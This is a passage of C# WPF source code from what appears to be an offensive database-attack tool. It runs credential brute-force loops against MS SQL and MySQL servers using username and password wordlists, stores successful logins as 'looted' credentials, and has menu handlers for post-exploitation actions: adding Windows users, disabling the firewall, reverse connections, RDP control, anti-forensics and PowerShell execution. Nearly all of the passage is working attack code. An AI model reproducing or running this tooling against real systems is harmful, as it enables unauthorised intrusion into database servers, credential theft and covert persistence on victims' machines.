                                    var connStr = $"Data Source={split[0]};uid={UserName};pwd={fastPasswordList[r]};pooling=true;connection lifetime=10;";
                                    var conn = new SqlConnection(connStr);
                                    conn.Open();
                                    if (conn.State == ConnectionState.Open)
                                    {

                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("Found1")}{split[0]} {_languageControl.SelectedLanguage.GetString("Found2")} {_languageControl.SelectedLanguage.GetString("LabelPassword")}:{fastPasswordList[r]}{_languageControl.SelectedLanguage.GetString("Found3")}");
                                            progBarPass.Value = fastPasswordList.Count;
                                        });
                                        Dispatcher.Invoke(new Action(() => {
                                            lstResult.Items.Add(lstFoundedAddress.Items[f] + ":" + UserName + ":" + fastPasswordList[r]);
                                            _foundedPasswordList.Add(lstFoundedAddress.Items[f] + ":" + UserName + ":" + fastPasswordList[r]);
                                        }));

                                    }
                                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                    {
                                        progBarPass.Value = r;
                                    });

                                    conn.Close();
                                    break;
                                }
                                catch (SqlException)
                                {

                                }
                            }
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                progBarPass.Value = r;
                            });
                        }
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            progBarPass.Value = fastPasswordList.Count;
                        });

                    }
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        progBar.Value = lstFoundedAddress.Items.Count;
                    });


                    #endregion
                    //Oracle - Mysql
                    #region
                    if (mySqlBool1)
                    {
                        try
                        {
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MySqlAttack1")}");
                            });
                            for (var q = 0; q < fastPasswordList.Count; q++)
                            {
                                if (_HasStopRequest == true)
                                {
                                    _HasStopRequest = false;
                                    break;
                                }
                                try
                                {
                                    MySqlConnectionStringBuilder con = null;
                                    Dispatcher.Invoke(new Action(() => {
                                        con = new MySqlConnectionStringBuilder() { Server = split[0], UserID = txtUserName.Text, Password = fastPasswordList[q] };
                                    }));
                                    
                                    var baglanti = new MySqlConnection(con.ToString());
                                    baglanti.Open();
                                    if (baglanti.State == ConnectionState.Open)
                                    {
                                        Dispatcher.Invoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("Found1")}{split[0]} {_languageControl.SelectedLanguage.GetString("Found2")} {_languageControl.SelectedLanguage.GetString("LabelPassword")}{fastPasswordList[q]}{_languageControl.SelectedLanguage.GetString("Found3")}");
                                            progBarPass.Value = fastPasswordList.Count;
                                            progBar.Value = f;
                                        });
                                        Dispatcher.Invoke(new Action(() => {
                                            lstResult.Items.Add(lstFoundedAddress.Items[f] + ":" + txtUserName.Text +":" + fastPasswordList[q]);
                                            _foundedPasswordList.Add(lstFoundedAddress.Items[f] + ":" + txtUserName.Text + ":" + fastPasswordList[q]);
                                        }));

                                        baglanti.Close();
                                        break;
                                    }
                                }
                                catch (MySqlException exp)
                                {
                                    var err = exp.Number;
                                    if (err == 1130)
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{split[0]} {_languageControl.SelectedLanguage.GetString("MySqlError2")}");
                                        });
                                        break;
                                    }
                                    else if (err == 2003)
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{split[0]} {_languageControl.SelectedLanguage.GetString("MySqlError1")}");
                                        });
                                        break;
                                    }
                                    else
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            progBarPass.Value = q;
                                        });
                                    }
                                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                    {
                                        progBarPass.Value = q;
                                    });
                                }
                                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                {
                                    progBar.Value = f;
                                });
                            }
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                progBar.Value = lstFoundedAddress.Items.Count;
                            });
                        }
                        catch (Exception exp)
                        {
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                            });
                        }
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            progBarPass.Value = fastPasswordList.Count;
                            progBar.Value = f;
                        });
                    }
                    #endregion
                    Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                progBar.Value = f;
                            });

                }
                Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                progBar.Value = lstFoundedAddress.Items.Count;
                            });
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("AttackFinish1")} {DateTime.Now.ToLongDateString()} {_languageControl.SelectedLanguage.GetString("AttackFinish2")} {DateTime.Now.ToLongTimeString()} {_languageControl.SelectedLanguage.GetString("AttackFinish3")}");
                });
                try
                {
                    Task.Factory.StartNew(ExploitMenuControl);
                    var savePasswordFile = new SaveLootedServer { LootedPasswordList = new List<string>() };
                    for (var i = 0; i < _foundedPasswordList.Count; i++)
                    {
                        savePasswordFile.LootedPasswordList.Add(_foundedPasswordList[i]);
                    }
                    Task.Factory.StartNew(savePasswordFile.SaveLootedSqlServer);
                }
                catch (Exception exp)
                {
                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                }
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });

            }
        }
        private void StaticPassScan()
        {
            try
            {
                var fastPasswordList = new List<string>();
                var fileName = _userFilePath;
                var fastPassText = File.ReadLines(fileName);
                var fastPasswordText = fastPassText as string[] ?? fastPassText.ToArray();
                var passCount = fastPasswordText.Count();
                for (var i = 0; i < passCount; i++)
                {
                    fastPasswordList.Add(fastPasswordText[i]);
                }
                var Password = string.Empty;
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    progBar.Minimum = 0;
                    progBar.Maximum = lstFoundedAddress.Items.Count;
                    progBarPass.Value = 0;
                    progBarPass.Maximum = fastPasswordList.Count;
                    Password = txtPass.Text;
                });

                for (var f = 0; f < lstFoundedAddress.Items.Count; f++)
                {
                    var split = lstFoundedAddress.Items[f].ToString().Split(':');
                    Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                try
                                {
                                    txtStatus.AppendText(string.Format("{0}{1} {3}{0}{4}{2} {5}", Environment.NewLine, lstFoundedAddress.Items[f], DateTime.Now, _languageControl.SelectedLanguage.GetString("AttackStart1"), _languageControl.SelectedLanguage.GetString("AttackStart2"), _languageControl.SelectedLanguage.GetString("AttackStart3")));
                                }
                                catch (Exception exp)
                                {
                                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                                }
                            });

                    _serverType = lstFoundedAddress.Items[f].ToString();

                    var msSqlBool1 = _serverType.Contains("1433");
                    var mySqlBool1 = _serverType.Contains("3306");

                    //Microsoft SQL
                    #region
                    if (msSqlBool1)
                    {
                        for (var r = 0; r < fastPasswordList.Count; r++)
                        {
                            if (_HasStopRequest == true)
                            {
                                _HasStopRequest = false;
                                break;
                            }
                            else
                            {
                                try
                                {
                                    var connStr = string.Empty;
                                    Dispatcher.Invoke(DispatcherPriority.Send, (Action)delegate
                                    {
                                        connStr =
                                           $"Data Source={split[0]};uid={fastPasswordList[r]};pwd={Password};pooling=true;connection lifetime=10;";
                                    });
                                    var conn = new SqlConnection(connStr);
                                    conn.Open();
                                    if (conn.State == ConnectionState.Open)
                                    {

                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("Found1")}{split[0]} {_languageControl.SelectedLanguage.GetString("Found2")} {_languageControl.SelectedLanguage.GetString("LabelPassword")}:{fastPasswordList[r]}{_languageControl.SelectedLanguage.GetString("Found3")}");
                                            progBarPass.Value = fastPasswordList.Count;
                                        });
                                        Dispatcher.Invoke(new Action(() => {
                                            lstResult.Items.Add(lstFoundedAddress.Items[f] + ":" + fastPasswordList[r] + ":" + Password);
                                            _foundedPasswordList.Add(lstFoundedAddress.Items[f] + ":" + fastPasswordList[r] + ":" + Password);
                                        }));

                                    }
                                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                    {
                                        progBarPass.Value = r;
                                    });

                                    conn.Close();
                                    break;
                                }
                                catch (SqlException)
                                {

                                }
                            }
                            
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                progBarPass.Value = r;
                            });
                        }
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            progBarPass.Value = fastPasswordList.Count;
                        });

                    }
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        progBar.Value = lstFoundedAddress.Items.Count;
                    });


                    #endregion
                    //Oracle - Mysql
                    #region
                    if (mySqlBool1)
                    {
                        try
                        {
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MySqlAttack1")}");
                            });
                            for (var q = 0; q < fastPasswordList.Count; q++)
                            {
                                if (_HasStopRequest == true)
                                {
                                    _HasStopRequest = false;
                                    break;
                                }
                                try
                                {
                                    MySqlConnectionStringBuilder con = null;
                                    Dispatcher.Invoke(new Action(() => {
                                        con = new MySqlConnectionStringBuilder() { Server = split[0], UserID = fastPasswordList[q], Password = txtPass.Text };
                                    }));

                                    var baglanti = new MySqlConnection(con.ToString());
                                    baglanti.Open();
                                    if (baglanti.State == ConnectionState.Open)
                                    {
                                        Dispatcher.Invoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("Found1")}{split[0]} {_languageControl.SelectedLanguage.GetString("Found2")} {_languageControl.SelectedLanguage.GetString("LabelPassword")}{fastPasswordList[q]}{_languageControl.SelectedLanguage.GetString("Found3")}");
                                            progBarPass.Value = fastPasswordList.Count;
                                            progBar.Value = f;
                                        });
                                        Dispatcher.Invoke(new Action(() => {
                                            lstResult.Items.Add(lstFoundedAddress.Items[f] + ":" + fastPasswordList[q] + ":" + txtPass.Text);
                                            _foundedPasswordList.Add(lstFoundedAddress.Items[f] + ":" + fastPasswordList[q] + ":" + txtPass.Text);
                                        }));

                                        baglanti.Close();
                                        break;
                                    }
                                }
                                catch (MySqlException exp)
                                {
                                    var err = exp.Number;
                                    if (err == 1130)
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{split[0]} {_languageControl.SelectedLanguage.GetString("MySqlError2")}");
                                        });
                                        break;
                                    }
                                    else if (err == 2003)
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            txtStatus.AppendText($"{Environment.NewLine}{split[0]} {_languageControl.SelectedLanguage.GetString("MySqlError1")}");
                                        });
                                        break;
                                    }
                                    else
                                    {
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            progBarPass.Value = q;
                                        });
                                    }
                                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                    {
                                        progBarPass.Value = q;
                                    });
                                }
                                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                {
                                    progBar.Value = f;
                                });
                            }
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                progBar.Value = lstFoundedAddress.Items.Count;
                            });
                        }
                        catch (Exception exp)
                        {
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                            });
                        }
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            progBarPass.Value = fastPasswordList.Count;
                            progBar.Value = f;
                        });
                    }
                    #endregion
                    Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                progBar.Value = f;
                            });

                }
                Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                progBar.Value = lstFoundedAddress.Items.Count;
                            });
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("AttackFinish1")} {DateTime.Now.ToLongDateString()} {_languageControl.SelectedLanguage.GetString("AttackFinish2")} {DateTime.Now.ToLongTimeString()} {_languageControl.SelectedLanguage.GetString("AttackFinish3")}");
                });
                try
                {
                    Task.Factory.StartNew(ExploitMenuControl);
                    var savePasswordFile = new SaveLootedServer { LootedPasswordList = new List<string>() };
                    for (var i = 0; i < _foundedPasswordList.Count; i++)
                    {
                        savePasswordFile.LootedPasswordList.Add(_foundedPasswordList[i]);
                    }
                    Task.Factory.StartNew(savePasswordFile.SaveLootedSqlServer);
                }
                catch (Exception exp)
                {
                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                }                
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });

            }
        }
        private void UserAndPasswordListScan()
        {
            try
            {
                var fastPasswordList = new List<string>();
                var fileName = _userPassPath;
                var passText = File.ReadLines(fileName);
                var passwordText = passText as string[] ?? passText.ToArray();
                var passCount = passwordText.Count();
                for (var i = 0; i < passCount; i++)
                {
                    fastPasswordList.Add(passwordText[i]);
                }

                var userList = new List<string>();
                var ufileName = _userPassPath;
                var uText = File.ReadLines(ufileName);
                var userText = uText as string[] ?? uText.ToArray();
                var userCount = userText.Count();
                for (var i = 0; i < userCount; i++)
                {
                    userList.Add(userText[i]);
                }

                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    progBar.Minimum = 0;
                    progBar.Maximum = userList.Count;
                    progBarPass.Value = 0;
                    progBarPass.Maximum = fastPasswordList.Count;
                });

                for (var f = 0; f < lstFoundedAddress.Items.Count; f++)
                {
                    if (_HasStopRequest == true)
                    {
                        _HasStopRequest = false;
                        break;
                    }
                    var split = lstFoundedAddress.Items[f].ToString().Split(':');
                    Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                try
                                {
                                    txtStatus.AppendText(string.Format("{0}{1} {3}{0}{4}{2} {5}", Environment.NewLine, lstFoundedAddress.Items[f], DateTime.Now, _languageControl.SelectedLanguage.GetString("AttackStart1"), _languageControl.SelectedLanguage.GetString("AttackStart2"), _languageControl.SelectedLanguage.GetString("AttackStart3")));
                                }
                                catch (Exception exp)
                                {
                                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                                }
                            });

                    _serverType = lstFoundedAddress.Items[f].ToString();

                    var msSqlBool1 = _serverType.Contains("1433");
                    var mySqlBool1 = _serverType.Contains("3306");

                    //Microsoft SQL
                    #region
                    if (msSqlBool1)
                    {
                        for (int s = 0; s < userList.Count; s++)
                        {
                            if (_HasStopRequest == true)
                            {
                                _HasStopRequest = false;
                                break;
                            }
                            else
                            {
                                for (var r = 0; r < fastPasswordList.Count; r++)
                                {
                                    if (_HasStopRequest == true)
                                    {
                                        break;
                                    }
                                    else
                                    {
                                        try
                                        {
                                            var connStr =
                                                $"Data Source={split[0]};uid={userList[s]};pwd={fastPasswordList[r]};pooling=true;connection lifetime=10;";
                                            var conn = new SqlConnection(connStr);
                                            conn.Open();
                                            if (conn.State == ConnectionState.Open)
                                            {

                                                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                                {
                                                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("Found1")}{split[0]} {_languageControl.SelectedLanguage.GetString("Found2")} {_languageControl.SelectedLanguage.GetString("LabelPassword")}:{fastPasswordList[r]}{_languageControl.SelectedLanguage.GetString("Found3")}");
                                                    progBarPass.Value = fastPasswordList.Count;
                                                });
                                                Dispatcher.Invoke(new Action(() => {
                                                    lstResult.Items.Add(lstFoundedAddress.Items[f] + ":" + userList[s] + ":" + fastPasswordList[r]);
                                                    _foundedPasswordList.Add(lstFoundedAddress.Items[f] + ":" + userList[s] + ":" + fastPasswordList[r]);
                                                }));

                                            }
                                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                            {
                                                progBarPass.Value = r;
                                            });

                                            conn.Close();
                                            break;
                                        }
                                        catch (SqlException)
                                        {

                                        }
                                    }

                                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                    {
                                        progBarPass.Value = r;
                                    });
                                }
                            }
                            
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                progBar.Value = s;
                            });
                        }
                        
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            progBar.Value = userList.Count;
                            progBarPass.Value = fastPasswordList.Count;
                        });

                    }
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        progBar.Value = lstFoundedAddress.Items.Count;
                    });


                    #endregion
                    //Oracle - Mysql
                    #region
                    if (mySqlBool1)
                    {
                        for (int i = 0; i < userList.Count; i++)
                        {
                            if (_HasStopRequest == true)
                            {
                                break;
                            }
                            try
                            {
                                //Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                //{
                                //    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MySqlAttack1")}");
                                //});
                                for (var q = 0; q < fastPasswordList.Count; q++)
                                {
                                    if (_HasStopRequest == true)
                                    {
                                        break;
                                    }
                                    try
                                    {
                                        MySqlConnectionStringBuilder con = null;
                                        Dispatcher.Invoke(new Action(() => {
                                            con = new MySqlConnectionStringBuilder() { Server = split[0], UserID = userList[i], Password = fastPasswordList[q] };
                                        }));

                                        var baglanti = new MySqlConnection(con.ToString());
                                        baglanti.Open();
                                        if (baglanti.State == ConnectionState.Open)
                                        {
                                            Dispatcher.Invoke(DispatcherPriority.Send, (Action)delegate
                                            {
                                                txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("Found1")}{split[0]} {_languageControl.SelectedLanguage.GetString("Found2")} {_languageControl.SelectedLanguage.GetString("LabelPassword")}{fastPasswordList[q]}{_languageControl.SelectedLanguage.GetString("Found3")}");
                                                progBarPass.Value = fastPasswordList.Count;
                                                progBar.Value = i;
                                            });
                                            Dispatcher.Invoke(new Action(() => {
                                                lstResult.Items.Add(lstFoundedAddress.Items[f] + ":" + userList[i] + ":" + fastPasswordList[q]);
                                                _foundedPasswordList.Add(lstFoundedAddress.Items[f] + ":" + userList[i] + ":" + fastPasswordList[q]);
                                            }));

                                            baglanti.Close();
                                            break;
                                        }
                                    }
                                    catch (MySqlException exp)
                                    {
                                        var err = exp.Number;
                                        if (err == 1130)
                                        {
                                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                            {
                                                txtStatus.AppendText($"{Environment.NewLine}{split[0]} {_languageControl.SelectedLanguage.GetString("MySqlError2")}");
                                            });
                                            break;
                                        }
                                        else if (err == 2003)
                                        {
                                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                            {
                                                txtStatus.AppendText($"{Environment.NewLine}{split[0]} {_languageControl.SelectedLanguage.GetString("MySqlError1")}");
                                            });
                                            break;
                                        }
                                        else
                                        {
                                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                            {
                                                progBarPass.Value = q;
                                            });
                                        }
                                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                        {
                                            progBarPass.Value = q;
                                        });
                                    }
                                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                    {
                                        progBar.Value = i;
                                    });
                                }
                                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                {
                                    progBar.Value = i;
                                });
                            }
                            catch (Exception exp)
                            {
                                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                                {
                                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                                });
                            }
                        }
                        
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            progBarPass.Value = fastPasswordList.Count;
                            progBar.Value = userList.Count;
                        });
                    }
                    #endregion
                    Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                progBar.Value = f;
                            });

                }
                Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                progBar.Value = userList.Count;
                            });
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("AttackFinish1")} {DateTime.Now.ToLongDateString()} {_languageControl.SelectedLanguage.GetString("AttackFinish2")} {DateTime.Now.ToLongTimeString()} {_languageControl.SelectedLanguage.GetString("AttackFinish3")}");
                });
                try
                {
                    Task.Factory.StartNew(ExploitMenuControl);
                    var savePasswordFile = new SaveLootedServer { LootedPasswordList = new List<string>() };
                    for (var i = 0; i < _foundedPasswordList.Count; i++)
                    {
                        savePasswordFile.LootedPasswordList.Add(_foundedPasswordList[i]);
                    }
                    Task.Factory.StartNew(savePasswordFile.SaveLootedSqlServer);
                }
                catch (Exception exp)
                {
                    txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                }
                
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)delegate
                            {
                                txtStatus.AppendText(string.Format("{0}{2}{0}{3}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                            });
            }
        }

        private void btnFileUser_Click(object sender, RoutedEventArgs e)
        {
            Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)OpenUserList);
        }
        private void btnFilePass_Click(object sender, RoutedEventArgs e)
        {
            Dispatcher.BeginInvoke(DispatcherPriority.Send,
                            (Action)OpenPassList);
        }

        private void rdStaticUser_Checked(object sender, RoutedEventArgs e)
        {
            if (rdStaticUser.IsChecked == true)
            {
                btnFilePass.IsEnabled = true;
                btnFileUser.IsEnabled = false;
                txtPass.IsReadOnly = true;
                txtUserName.Background = System.Windows.Media.Brushes.Red;
                txtPass.Background = System.Windows.Media.Brushes.White;
                txtUserName.IsReadOnly = false;
                lblSelectedPassList.Content = string.Empty;
                lblSelectedUserList.Content = string.Empty;
                txtPass.Text = string.Empty;
                txtUserName.Text = string.Empty;
            }
            else
            {
                btnFilePass.IsEnabled = false;
                btnFileUser.IsEnabled = false;
            }
        }
        private void rdStaticPass_Checked(object sender, RoutedEventArgs e)
        {
            if (rdStaticPass.IsChecked == true)
            {
                Dispatcher.Invoke(new Action(() => {
                    txtPass.Background = System.Windows.Media.Brushes.Red;
                    txtUserName.Background = System.Windows.Media.Brushes.White;
                    btnFilePass.IsEnabled = false;
                    btnFileUser.IsEnabled = true;
                    txtPass.IsReadOnly = false;
                    txtUserName.IsReadOnly = true;
                    lblSelectedPassList.Content = string.Empty;
                    lblSelectedUserList.Content = string.Empty;
                    txtPass.Text = string.Empty;
                    txtUserName.Text = string.Empty;
                }));                
            }
        }
        private void rdUserPassList_Checked(object sender, RoutedEventArgs e)
        {
            if (rdUserPassList.IsChecked == true)
            {
                btnFilePass.IsEnabled = true;
                btnFileUser.IsEnabled = true;
                txtPass.IsReadOnly = true;
                txtUserName.IsReadOnly = true;
                txtPass.Background = System.Windows.Media.Brushes.White;
                txtUserName.Background = System.Windows.Media.Brushes.White;
                lblSelectedPassList.Content = string.Empty;
                lblSelectedUserList.Content = string.Empty;
                txtPass.Text = string.Empty;
                txtUserName.Text = string.Empty;
            }
            else
            {
                btnFilePass.IsEnabled = false;
                btnFileUser.IsEnabled = false;
            }
        }
        private void rdPassExtended_Checked(object sender, RoutedEventArgs e)
        {
            btnFilePass.IsEnabled = false;
            btnFileUser.IsEnabled = false;
            txtPass.Background = System.Windows.Media.Brushes.White;
            txtUserName.Background = System.Windows.Media.Brushes.White;
            lblSelectedPassList.Content = string.Empty;
            lblSelectedUserList.Content = string.Empty;
            txtPass.Text = string.Empty;
            txtUserName.Text = string.Empty;
        }
        private void rdPassFast_Checked(object sender, RoutedEventArgs e)
        {
            btnFilePass.IsEnabled = false;
            btnFileUser.IsEnabled = false;
            txtPass.Background = System.Windows.Media.Brushes.White;
            txtUserName.Background = System.Windows.Media.Brushes.White;
            lblSelectedPassList.Content = string.Empty;
            lblSelectedUserList.Content = string.Empty;
            txtPass.Text = string.Empty;
            txtUserName.Text = string.Empty;
        }

        private void menuLanguageEnglish_Click(object sender, RoutedEventArgs e)
        {
            _languageControl.SetLanguage = "English";
            _languageControl.SetLang();
        }
        private void menuLanguageTurkish_Click(object sender, RoutedEventArgs e)
        {
            _languageControl.SetLanguage = "Turkish";
            _languageControl.SetLang();
        }
        private void menuExploitMsSqlEnum_Click(object sender, RoutedEventArgs e)
        {
            Attack.MSSQL.FrmEnumMsSql frmEnum = new Attack.MSSQL.FrmEnumMsSql();
            frmEnum.ShowDialog();
        }        
        private void menuExploitMsSqlSystemInfo_Click(object sender, RoutedEventArgs e)
        {
            var frmInfo = new Attack.MSSQL.FrmSystemInfo();
            frmInfo.ShowDialog();
        }
        private void menuExploitMSSQLWindowsUserList_Click(object sender, RoutedEventArgs e)
        {
            var frmUserList = new Attack.MSSQL.FrmShowUserList();
            frmUserList.ShowDialog();
        }
        private void menuExploitMsSqlTaskManager_Click(object sender, RoutedEventArgs e)
        {
            var frmTask = new Attack.MSSQL.FrmTaskManager();
            frmTask.ShowDialog();
        }
        private void menuExploitMsSqlServiceManager_Click(object sender, RoutedEventArgs e)
        {
            var frmService = new Attack.MSSQL.FrmServiceManager();
            frmService.ShowDialog();
        }
        private void menuExploitMsSqlAllPrograms_Click(object sender, RoutedEventArgs e)
        {
            var frmPrograms = new Attack.MSSQL.FrmAllPrograms();
            frmPrograms.ShowDialog();
        }
        private void menuExploitMsSqlDirectoryList_Click(object sender, RoutedEventArgs e)
        {
            var frmDirectory = new Attack.MSSQL.FrmDirectoryManager();
            frmDirectory.ShowDialog();
        }
        private void menuExploitMsSqlSQLUserAdd_Click(object sender, RoutedEventArgs e)
        {
            var addMssqlUser = new Attack.MSSQL.FrmAddMsSqlUser();
            addMssqlUser.ShowDialog();
        }
        private void menuExploitMsSqlLocalUserAdd_Click(object sender, RoutedEventArgs e)
        {
            var addWinUser = new Attack.MSSQL.FrmAddWindowsUser();
            addWinUser.ShowDialog();
        }
        private void menuExploitMSSQLDisableWindowsFirewall_Click(object sender, RoutedEventArgs e)
        {
            var disableFw = new Attack.MSSQL.FrmDisableWindowsFirewall();
            disableFw.ShowDialog();
        }
        private void menuExploitMsSqlReverseConnection_Click(object sender, RoutedEventArgs e)
        {
            var frmRevConn = new Attack.MSSQL.FrmReverseConnection();
            frmRevConn.ShowDialog();
        }
        private void menuExploitMsSqlRDP_Click(object sender, RoutedEventArgs e)
        {
            var rdpMan = new Attack.MSSQL.FrmRdpManager();
            rdpMan.ShowDialog();
        }
        private void MenuExploitMsSqlAntiForensics_OnClick(object sender, RoutedEventArgs e)
        {
            var antiForensics = new FrmAntiForensics();
            antiForensics.ShowDialog();
        }
        private void MenuExploitMsSqlPowershell_OnClick(object sender, RoutedEventArgs e)
        {
            var ps = new FrmPowerShell();
            ps.ShowDialog();
        }
        private void btnStop_Click(object sender, RoutedEventArgs e)
        {
            _HasStopRequest = true;
        }
        private void menuExploitMsSqlFileUpload_Click(object sender, RoutedEventArgs e)
        {
